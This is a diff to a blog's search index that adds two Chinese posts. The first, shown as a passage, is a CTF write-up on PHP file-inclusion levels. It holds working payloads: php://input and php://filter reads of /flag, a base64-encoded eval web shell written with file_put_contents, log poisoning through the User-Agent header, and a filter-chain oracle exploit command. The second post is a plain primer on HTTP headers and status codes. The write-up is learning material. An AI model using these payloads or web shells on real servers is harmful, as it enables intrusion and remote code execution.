+Content-Type: application/json&#123;&quot;name&quot;:&quot;alice&quot;&#125;
+
+可以这样读取：
+$data = json_decode(    file_get_contents(&#x27;php://input&#x27;),    true);echo $data[&#x27;name&#x27;];
+
+在文件包含场景中，如果代码是：
+include(&#x27;php://input&#x27;);
+
+那么 PHP 会把请求体当作被包含文件处理。比如请求体是：
+&lt;?php echo &quot;OK&quot;; ?&gt;
+
+就可能执行这段代码
+php://filter 是一个“过滤器包装器”。它会在读取或写入目标资源时，先对数据进行转换。它本身不代表某个文件，真正的文件由 resource= 指定
+php://filter/[过滤器参数]/resource=目标资源php://filter/read=过滤器/resource=文件php://filter/read=convert.base64-encode/resource=secret.php
+
+常用的过滤器
+
+
+
+过滤器
+功能
+示例
+
+
+
+convert.base64-encode
+Base64 编码
+read=convert.base64-encode
+
+
+convert.base64-decode
+Base64 解码
+read=convert.base64-decode
+
+
+string.rot13
+ROT13 转换
+read=string.rot13
+
+
+string.toupper
+转换为大写
+read=string.toupper
+
+
+string.tolower
+转换为小写
+read=string.tolower
+
+
+
+这里直接构造?wrappers=filter/read=convert.base64-encode/resource=/flag
+
+
+level7php://伪协议
+这个题目看到是php://input 得用post
+
+level8php://伪协议直接构造?wrappers=filter/read=convert.base64-encode/resource=/flag
+然后base64解码得到flag
+
+
+level9php://伪协议和上一个题目的构造是一样的，然后base64解码
+
+level10file_get_contents() 函数file_get_contents() 的作用是：读取整个资源，并把内容作为字符串返回。
+基本用法：
+$content = file_get_contents(&#x27;test.txt&#x27;);echo $content;
+
+它也支持各种 PHP 流包装器：
+file_get_contents(&#x27;/flag&#x27;);                         // 本地文件file_get_contents(&#x27;file:///tmp/a.txt&#x27;);             // file 包装器file_get_contents(&#x27;http://example.com/a.txt&#x27;);      // HTTP 资源file_get_contents(&#x27;php://input&#x27;);                   // 原始请求体file_get_contents(    &#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;);                                                  // 经过过滤器读取
+
+
+直接file=/flag也可以
+直接构造?file=php://filter/read=convert.base64-encode/resource=/flag 也可以
+level11file_put_contents()函数file_put_contents() 用来把数据写入文件
+file_put_contents($filename, $data);
+
+那么我们可以先用?filename=php://filter/write=convert.base64-decode/resource=shell.php
+它不是普通的 shell.php，而是告诉 PHP：
+写入数据时，先进行 Base64 解码，然后把解码结果写入 shell.php
+
+写入一个shell.php然后给这个post一个data=PD9waHAgZXZhbCgkX1BPU1RbJzEnXSk7Pz4
+PD9waHAgZXZhbCgkX1BPU1RbJzEnXSk7Pz4()
+因为也是一样过滤了等号，所以这样写入，然后访问一下shell.php
+
+整个过程可以分成两步：
+第一步：写入阶段Base64 字符串 → 解码 → 保存为 shell.php第二步：访问阶段访问 shell.php → PHP 解释其中的代码
+
+然后给1传一下命令
+
+level11plus自定义过滤
+这里在file_put_contents()函数的data前面加上了一个php的代码，不管怎么样这段代码都是插在data前面的
+我们想一下之前是怎么做的?filename=php://filter/write=convert.base64-decode/resource=shell.php
+先写进去一个shell，data进去的时候进行base64解码，但是这里被添加了一块php代码，我们直接还是采用这样的方式，这段代码也是要直接被base64解码的，那么这段代码就会被解释成一些乱码，因为它原本不是base64加密过的密文，那么解码之后肯定就会是乱的
+那么还是这样构造
+然后给data传base64加密后的参数data=aaPD9waHAgQGV2YWwoJF9QT1NUWydhdyddKTsgPz4
+这里等于&lt;?php @eval($_POST[&#39;aw&#39;]); ?&gt;
+然后就是和上一道一样了，给aw传参数查看flag
+
+level12远程文件包含
+代码中已经包含了远程文件，直接POST参数a即可
+level13LFI日志文件包含Nginx可以利用 Nginx 的访问日志作为“可写文件”。
+User-Agent 只是一个方便注入的位置。它本来用于表示浏览器信息，例如：
+User-Agent: Mozilla/5.0
+
+但它由客户端发送，可以修改：
+User-Agent: &lt;?= &quot;OK&quot;; ?&gt;
+
+Nginx 通常会把 User-Agent 记录到访问日志中。于是日志里会出现类似：
+127.0.0.1 ... &quot;GET / HTTP/1.1&quot; ... &quot;&lt;?= &quot;OK&quot;; ?&gt;&quot;
+
+接着程序执行：
+include(&#x27;/var/log/nginx/access.log&#x27;);
+
+PHP 会把整个日志当作 PHP 文件解析，于是日志中的：
+&lt;?= &quot;OK&quot;; ?&gt;
+
+就会执行
+使用的流程是：
+User-Agent: &lt;?= @eval($_POST[&#x27;1&#x27;]); ?&gt;
+
+先写入 Nginx 日志，再请求：
+/?file=/var/log/nginx/access.log
+
+并提交：
+1=echo file_get_contents(&#x27;/flag&#x27;);
+
+
+这里不知道过滤了啥玩意，直接包含flag也可以出来
+level14LFI日志文件包含Apache和上一道题同样的流程
+
+level15Session文件包含session文件包含整不出来，直接?file=/flag出flag了
+level16直接?file=/flag出flag了,可能是有点问题
+level17使用了官方提供的 Filter Chain Oracle 脚本，目标参数是：
+python3 filters_chain_oracle_exploit.py \  --target &#x27;http://80-afe84092-ed42-4cfc-a366-b672eeded31a.challenge.ctfplus.cn/&#x27; \  --file /flag \  --parameter file
+
+因为代码通过 POST 的 file 参数调用 file()，脚本利用 php://filter 链让响应差异充当字符判断 Oracle，逐字符读取 /flag。
+Level18require&#x2F;include_once 缺陷第一次已经包含,直接再次包含 flag.php 会被跳过。利用 /proc/self/root 的多级符号链接，让 PHP 判重时看到“不同路径”，但实际仍指向同一个文件。重复约 25次是因为每个 /proc/self/root 涉及多级符号链接，超过 PHP 的路径解析限制后，判重哈希中的路径与第一次包含的路径不同
+?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
+
+level19?file=../../../flag
+后面不会了，学会了再补
+]]></content>
+      <categories>
+        <category>web安全学习</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>PHP</tag>
+        <tag>文件包含</tag>
       </tags>
   </entry>
   <entry>
@@ -1158,6 +1508,63 @@ npx hexo new post &quot;文章标题&quot;
         <tag>Hexo</tag>
         <tag>NexT</tag>
         <tag>GitHub Pages</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HTTP协议学习：从请求头到响应头</title>
+    <url>/2026/10/28/http-protocol-learning/</url>
+    <content><![CDATA[本文结合 moectf 2024 的 ezhttp 题目，整理 HTTP 请求行、常见请求头、请求体，以及响应状态码和响应头。
+
+
+HTTP 请求
+HTTP 请求的第一行叫请求行，包含请求方法、请求目标和 HTTP 版本。常见方法有：
+
+GET：获取指定资源。
+POST：向服务器提交数据，常用于创建或处理资源。
+HEAD：请求与 GET 类似，但只返回响应头，不返回响应体。
+
+请求行下面是请求头，常见字段包括：
+
+Host：请求访问的主机名。
+X-Forwarded-For：代理服务器常用来传递客户端 IP。只有来自可信代理的值才应作为真实来源，因为客户端可能自行伪造它。
+Referer：表示请求从哪个页面发起。
+User-Agent：描述客户端使用的设备、操作系统和浏览器等信息。
+Content-Type：描述请求体的数据格式，例如表单或 JSON。
+
+请求头之后是请求体。题目中的请求体示例为 imoau=sb。如果提交 JSON，请求头中的 Content-Type 通常应设为 application/json；表单数据则使用对应的表单媒体类型。
+HTTP 响应
+服务器响应的第一行包含 HTTP 版本、状态码和状态描述。状态码按范围表示处理结果：
+
+1xx：信息响应，请求仍在处理中。
+2xx：请求已成功处理。
+3xx：需要重定向或进一步操作。
+4xx：请求存在问题，或服务器无法按请求提供资源。
+5xx：服务器处理请求时发生错误。
+
+常见状态码：
+
+200 OK：请求成功。
+301 Moved Permanently：资源已永久迁移，响应会提供新的地址。
+404 Not Found：服务器找不到请求的资源。
+418 I’m a teapot：一个真实定义过的状态码，源自愚人节 RFC，常作为趣味状态码出现。
+500 Internal Server Error：服务器遇到未预期的错误。
+
+响应状态行下面是响应头，常见字段包括：
+
+Server：服务器软件信息；出于安全考虑，服务器可能会隐藏或简化此字段。
+Content-Type：响应体的媒体类型，例如 text/html 或 application/json。
+Set-Cookie：让浏览器保存或更新 Cookie。
+Content-Length：响应体的长度（以字节计，具体行为也受传输方式影响）。
+
+响应头之后是响应体，通常包含浏览器最终显示的页面内容或接口返回的数据。
+]]></content>
+      <categories>
+        <category>web安全学习</category>
+      </categories>
+      <tags>
+        <tag>Web安全</tag>
+        <tag>CTF</tag>
+        <tag>HTTP</tag>
       </tags>
   </entry>
 </search>
